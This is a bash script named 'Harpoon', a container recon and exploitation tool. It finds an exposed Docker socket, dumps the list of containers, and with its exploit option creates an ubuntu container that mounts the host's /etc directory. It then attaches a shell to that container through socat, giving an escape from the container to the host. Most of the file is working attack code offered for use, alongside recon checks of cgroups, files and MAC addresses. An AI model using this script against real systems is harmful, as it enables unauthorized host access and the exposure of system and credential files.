#!/bin/bash


# some commands
CURL_LIST_CONTAINERS="curl -s -XGET --unix-socket {{SOCK_PATH}} http://localhost/containers/json 2>&1"
DOCKER_SOCK_PATH=""

read -r -d '' DEFAULT_DOCKER_PAYLOAD << EOM
{
  "Image":"ubuntu",
  "Cmd":["/bin/sh"],
  "DetachKeys":"Ctrl-p,Ctrl-q",
  "OpenStdin":true,
  "Mounts":[
    {
      "Type":"bind",
      "Source":"/etc/",
      "Target":"/host_etc"
    }
  ]
}
EOM

read -r -d '' DEFAULT_DOCKER_EXPLOIT_ATTACH_HTTP << EOM
POST /containers/$DOCKER_CONTAINER_ID/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
EOM

if [[ $# -eq 0 ]]; then
	HELP=1
fi

# TODO: Handle args
POSITIONAL=()
while [[ $# -gt 0 ]]; do
	key="$1"
	case $key in
		-c|--check_for_docker_sock)
		CHECK_FOR_DOCKER_SOCK=1
		shift
		;;
		-d|--dump_container_list)
		DUMP_CONTAINER_LIST=1
		shift
		;;
		-e|--exploit_docker_sock)
		EXPLOIT_DOCKER_SOCK=1
		shift # past arg
		;;
		-g|--check_cgroup)
		CHECK_CGROUP=1
		shift
		;;	
		-f|--find)
		RUN_FIND=1
		shift
		;;
		-m|--check_mac)
		CHECK_MAC=1
		shift
		;;
		-h|--help)
		HELP=1
		shift
		;;
		-s|--docker_sock)
		DOCKER_SOCK_PATH="$2"
		shift
		shift
		;;
		--default)
		DEFAULT=1
		shift
		;;
		*)
		shift
		;;
	esac		
done
set -- "${POSITIONAL[@]}" # restore positional paramters

help () {
	cat << "EOF" 
Harpoon

                          ,   ,
    ~~~~~~~~~~~~~~~~~~~~~~~"o"~~~~
            ____________     o
    	 _--            --_ o
        /       ___      __\ o
       / _         _\    \__o 
      / / |              X  |
     / /   \	           /
    / _ \   \             /
    \/ \/    -.____ ____.-

Containerization recon and exploitation tool.
Usage: aibc [options]

Options:
    -c, --check_for_docker_sock         try and find the docker socket on the system, only works if it's named docker.sock
    -d, --dump_container_list           if the docker socket was found then try to query it for a JSON blob of the containers on the host
    -e, --exploit_docker_sock           if the socket was found, try to create a container with host /etc/ mounted and attach a shell
    -g, --check_cgroup                  check the cgroup files for container runtimes, :/docker/, :/garden/, etc
    -f, --find                          use find to try and locate any files with a container runtime in the name
    -m, --check_mac                     check the eth0 mac address, docker assigns in a somewhat predictable manner, UNRELIABLE CHECK
    -s, --docker_sock <socket_path>     specify the path to the docker socket, this is needed for --dump_container_list and --exploit        
    -h, --help                          show this help
        --default                       run all the options
EOF
	exit 1
}

check_deps () {
	CURL=$(which curl)
	SOCAT=$(which socat)
	JQ=$(which jq)
	HAS_DEPS=1
	if [[ ! $CURL ]]; then
		# install curl
		#apt-get update && apt-get install -y curl
		echo "Warning: curl not installed, please install it."
		HAS_DEPS=0
	fi
	if [[ ! $SOCAT ]]; then
		#apt-get update && apt-get install -y socat
		echo "Warning: socat not installed, please install it."
		HAS_DEPS=0
	fi
	if [[ ! jq ]]; then
		echo "Warning: jq not installed, please install it."
		HAS_DEPS=0
	fi
	if [[ ! $HAS_DEPS ]]; then
		exit 2
	fi
}

dump_container_list () {
	if [[ ! $DOCKER_SOCK_PATH ]]; then
		echo "-s <socket_path> required"
		exit 2
	fi
	check_deps
	CURL_LIST_CONTAINERS=$(sed "s@{{SOCK_PATH}}@$DOCKER_SOCK_PATH@g" <<< $CURL_LIST_CONTAINERS)	
	JSON=$($CURL_LIST_CONTAINERS)
	echo $JSON
}

check_for_docker_sock () {
	echo "Checking for docker socket >:)"
	RES=$(find "/" 2>&1 | grep -E "(.*\/docker\.sock|^docker\.sock)$")
	if [[ $RES ]]; then
		echo -e "Found it!"
		echo -e "$RES\n"
		RES=$(sed -n '1p' <<< $RES)
		# DOCKER_SOCK_PATH=$RES
	else 
		echo -e "Couldn't locate the docker socket :(\n"
	fi
}

exploit_docker_sock () { 
	if [[ ! $DOCKER_SOCK_PATH ]]; then
		echo "-s <socket_path> required"
		exit 2
	fi

	CONTAINER_JSON='{"Image":"ubuntu","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/etc/","Target":"/host_etc"}]}'
	CREATE="curl -s -XPOST -H 'Content-Type: application/json' --unix-socket $DOCKER_SOCK_PATH -d '$CONTAINER_JSON' http://localhost/containers/create"
	RES=$(eval $CREATE)
	#echo $RES
	#DOCKER_CONTAINER_ID=$(sed -e 's/{"Id"://g' -e 's/",Warnings":.*//g' <<< $RES)
	DOCKER_CONTAINER_ID=$(jq '.Id' <<< $RES) 
	DOCKER_CONTAINER_ID=$(sed "s/\"//g" <<< $DOCKER_CONTAINER_ID)
	echo $DOCKER_CONTAINER_ID

read -r -d '' DOCKER_CONNECT_HEADERS << EOM 
POST /containers/$DOCKER_CONTAINER_ID/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp

EOM

	echo $DOCKER_CONNECT_HEADERS | socat - UNIX-CONNECT:$DOCKER_SOCK_PATH
}

check_cgroup () {
	# TODO: explore more container tech to expand this check, if possible
	echo "Checking cgroup..."
	cat /proc/1/cgroup | grep -E ":/docker/|:/garden/"
	echo -e "\n"
}

run_find () {
	echo "Searching from / ..."
	$(find "/" 2>&1 | grep -E "docker|garden")
	echo -e "\n"
}

check_mac () {
	echo "Checking ETH0 mac address..."
	echo "WARNING: Unreliable check!"
	cat /sys/class/net/eth0/address
	echo -e "Not fully implemented.\n"
}

if [[ $HELP ]]; then
	help
fi

if [[ $DEFAULT ]]; then
	echo "Running in default mode... checking everything."
	check_for_docker_sock
	check_cgroup
	run_find
	check_mac
fi

if [[ $CHECK_FOR_DOCKER_SOCK ]]; then
	check_for_docker_sock
fi

if [[ $DUMP_CONTAINER_LIST ]]; then
	dump_container_list
fi

if [[ $EXPLOIT_DOCKER_SOCK ]]; then
	exploit_docker_sock
fi

if [[ $CHECK_CGROUP ]]; then
	check_cgroup
fi

if [[ $RUN_FIND ]]; then
	run_find
fi

if [[ $CHECK_MAC ]]; then
	check_mac
fi
